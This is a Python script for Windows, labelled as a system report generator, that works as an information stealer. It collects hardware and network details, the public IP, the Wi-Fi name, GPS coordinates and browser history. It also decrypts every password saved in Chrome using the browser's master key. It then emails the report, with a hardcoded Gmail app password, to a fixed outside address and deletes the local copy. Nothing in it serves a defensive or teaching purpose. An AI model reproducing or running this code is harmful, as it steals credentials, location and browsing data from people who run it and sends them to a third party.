import os
import platform
import psutil
import requests
import subprocess
import sqlite3
import shutil
import re
import json
import win32crypt
from Crypto.Cipher import AES
import base64
import win32evtlog
import smtplib
import ssl
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Output file path
OUTPUT_FILE = os.path.join(os.path.expanduser("~"), "system_report.txt")

def write_to_file(data):
    """Writes data to the output file."""
    with open(OUTPUT_FILE, "a", encoding="utf-8") as file:
        file.write(data + "\n")

def clear_previous_report():
    """Clears the previous report if it exists."""
    if os.path.exists(OUTPUT_FILE):
        os.remove(OUTPUT_FILE)

# Get SystemInfo
def get_system_info():
    """Retrieves detailed system information."""
    system_data = [
        "\n[System Information]",
        f"Operating System: {platform.system()} {platform.release()} (Version: {platform.version()})",
        f"Architecture: {platform.architecture()[0]}",
        f"Machine Type: {platform.machine()}",
        f"Processor: {platform.processor()}",
        f"CPU Cores (Physical): {psutil.cpu_count(logical=False)}",
        f"CPU Threads (Logical): {psutil.cpu_count(logical=True)}",
        f"CPU Frequency: {psutil.cpu_freq().max:.2f} MHz",
        f"Total RAM: {round(psutil.virtual_memory().total / (1024**3), 2)} GB",
        f"Available RAM: {round(psutil.virtual_memory().available / (1024**3), 2)} GB",
        f"RAM Usage: {psutil.virtual_memory().percent}%",
        f"Total Disk Space: {round(psutil.disk_usage('/').total / (1024**3), 2)} GB",
        f"Free Disk Space: {round(psutil.disk_usage('/').free / (1024**3), 2)} GB",
        f"Disk Usage: {psutil.disk_usage('/').percent}%",
    ]
    return "\n".join(system_data)

# Get Public IP, MAC, WIFI SSID
def get_public_ip():
    """Fetches the public IP address using an external API."""
    try:
        response = requests.get("https://api64.ipify.org?format=json", timeout=5)
        if response.status_code == 200:
            ip_data = response.json()
            return f"\n[Public IP Address]\n{ip_data.get('ip', 'Unknown')}"
    except:
        return "\n[Public IP Address]\nCould not retrieve public IP"

def get_network_info():
    """Retrieves network details including Gateway IP and MAC Address."""
    try:
        network_data = ["\n[Network Information]"]

        # Get MAC Address
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == psutil.AF_LINK:
                    network_data.append(f"MAC Address: {addr.address}")
        
        return "\n".join(network_data)
    except:
        return "\n[Network Information]\nCould not retrieve network info"

def get_wifi_ssid():
    """Retrieves the connected Wi-Fi SSID (Network Name)."""
    try:
        ssid_output = subprocess.check_output("netsh wlan show interfaces", shell=True).decode(errors="ignore")
        for line in ssid_output.split("\n"):
            if "SSID" in line and "BSSID" not in line:
                return f"\n[Wi-Fi Network SSID]\n{line.split(':')[-1].strip()}"
    except:
        return "\n[Wi-Fi Network SSID]\nWi-Fi SSID Not Found"

# Get GPS Location
def get_gps_location():
    """Fetches GPS location using PowerShell (Windows Location Services)."""
    try:
        gps_command = (
            'powershell -ExecutionPolicy Bypass -Command "& {'
            'Add-Type -AssemblyName System.Device; '
            '$geo = New-Object System.Device.Location.GeoCoordinateWatcher; '
            '$geo.Start(); Start-Sleep -Seconds 2; '
            '$geo.Position.Location | Format-List}"'
        )
        
        gps_output = subprocess.check_output(gps_command, shell=True)
        gps_data = gps_output.decode('utf-8')

        # Extract Latitude & Longitude using regex
        pattern = r'Latitude\s*:\s*([\d.-]+).*?Longitude\s*:\s*([\d.-]+)'
        match = re.search(pattern, gps_data, re.DOTALL)

        if match:
            latitude = float(match.group(1))
            longitude = float(match.group(2))
            return f"\n[GPS Location]\nLatitude: {latitude}, Longitude: {longitude}"
        else:
            return "\n[GPS Location]\nCould not retrieve GPS data (Ensure Location Services is enabled in Windows)."
    except:
        return "\n[GPS Location]\nPowerShell GPS retrieval failed."

# Get Browser History
def get_browser_history():
    """Retrieves the last 10 visited websites from Chrome, Edge, and Firefox."""
    history_data = ["\n[Browser History]"]

    # Chrome History Path
    chrome_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
    
    # Edge History Path
    edge_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History")

    # Firefox History Path
    firefox_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")

    def extract_history(db_path, browser_name):
        """Extracts history from SQLite database."""
        if not os.path.exists(db_path):
            return f"{browser_name} history not found."

        try:
            temp_path = db_path + "_temp"
            shutil.copy2(db_path, temp_path)  # Copy to avoid DB lock
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 10")
            results = cursor.fetchall()
            conn.close()
            os.remove(temp_path)

            if results:
                return f"\n[{browser_name} History]\n" + "\n".join([f"{row[1]} ({row[0]})" for row in results])
            else:
                return f"\n[{browser_name} History]\nNo recent history found."
        except:
            return f"\n[{browser_name} History]\nCould not retrieve history."

    history_data.append(extract_history(chrome_path, "Chrome"))
    history_data.append(extract_history(edge_path, "Edge"))
    history_data.append(extract_history(firefox_path, "Firefox"))

    # Extract Firefox History
    if os.path.exists(firefox_path):
        for profile in os.listdir(firefox_path):
            places_db = os.path.join(firefox_path, profile, "places.sqlite")
            if os.path.exists(places_db):
                history_data.append(extract_history(places_db, "Firefox"))

    return "\n".join(history_data)

# Get Browser Password
def get_master_key():
    """Retrieve the master key from Chrome's Local State file."""
    local_state_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Local State')
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]  # Remove DPAPI prefix
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(encrypted_password, master_key):
    """Decrypt Chrome's stored passwords."""
    try:
        if encrypted_password[:3] == b'v10':  # Chrome 80+ AES Encryption
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()
        else:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
    except Exception as e:
        return f"[Error: {str(e)}]"

def copy_database(src_path, dest_path):
    """Copy the Chrome Login Data database to a temporary location."""
    if os.path.exists(dest_path):
        os.remove(dest_path)
    shutil.copy2(src_path, dest_path)

def get_chrome_passwords():
    """Retrieve and decrypt saved Chrome passwords."""
    try:
        master_key = get_master_key()
        chrome_db_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
        temp_db_path = os.path.expanduser("~\\AppData\\Local\\Temp\\chrome_login_data.db")
        
        copy_database(chrome_db_path, temp_db_path)

        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        passwords = []
        for row in cursor.fetchall():
            url, username, encrypted_password = row
            decrypted_password = decrypt_password(encrypted_password, master_key)
            passwords.append(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n{'-'*50}")

        conn.close()
        os.remove(temp_db_path)

        return "\n[Saved Chrome Passwords]\n" + "\n".join(passwords)
    except Exception as e:
        return f"\n[Saved Chrome Passwords]\nError: {str(e)}"

# Windows Event
def get_event_logs(log_type, max_events):
    server = 'localhost'
    log_handle = win32evtlog.OpenEventLog(server, log_type)
    
    write_to_file(f"\n[{log_type} Event Logs (Last {max_events} Entries)]")
    
    events_read = 0
    while True:
        events = win32evtlog.ReadEventLog(log_handle, win32evtlog.EVENTLOG_BACKWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ, 0)
        if not events:
            break
        
        for event in events:
            if events_read >= max_events:
                break
            
            event_details = (
                f"Time: {event.TimeGenerated}\n"
                f"Source: {event.SourceName}\n"
                f"Category: {event.EventCategory}\n"
                f"Event ID: {event.EventID}\n"
                f"Message: {event.StringInserts}\n"
                f"{'-'*50}\n"
            )
            write_to_file(event_details)
            events_read += 1
        
        if events_read >= max_events:
            break

    win32evtlog.CloseEventLog(log_handle)

def send_email():
    sender_email = "qrpay.69991@gmail.com"
    receiver_email = "sourav.bhaumik11@gmail.com"
    subject = "System Report"
    body = "Attached is the latest system report."

    # SMTP Server Configuration (For Gmail)
    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    smtp_password = "cpcy fwns ihka xwuk"  # Use an app password, not your real password!

    msg = MIMEMultipart()
    msg["From"] = sender_email
    msg["To"] = receiver_email
    msg["Subject"] = subject
    msg.attach(MIMEText(body, "plain"))

    # Attach the report file
    if os.path.exists(OUTPUT_FILE):
        with open(OUTPUT_FILE, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(OUTPUT_FILE)}")
            msg.attach(part)

    # Send Email
    try:
        context = ssl.create_default_context()
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls(context=context)
        server.login(sender_email, smtp_password)
        server.sendmail(sender_email, receiver_email, msg.as_string())
        server.quit()

        # Delete the file after sending
        os.remove(OUTPUT_FILE)

    except Exception as e:
        print(f"Error sending email: {str(e)}")

def generate_report():
    """Generates the full system report."""
    clear_previous_report()
    
    write_to_file("System Capture Report")
    write_to_file("=" * 50)
    
    write_to_file(get_system_info())
    write_to_file(get_public_ip())
    write_to_file(get_network_info())
    write_to_file(get_wifi_ssid())
    write_to_file(get_gps_location())
    write_to_file(get_browser_history())
    write_to_file(get_chrome_passwords())
    
    get_event_logs("System", max_events=10)
    get_event_logs("Application", max_events=10)
    
    
    print(f"Report saved to {OUTPUT_FILE}")
    send_email()  # Send the report after saving

if __name__ == "__main__":
    generate_report()
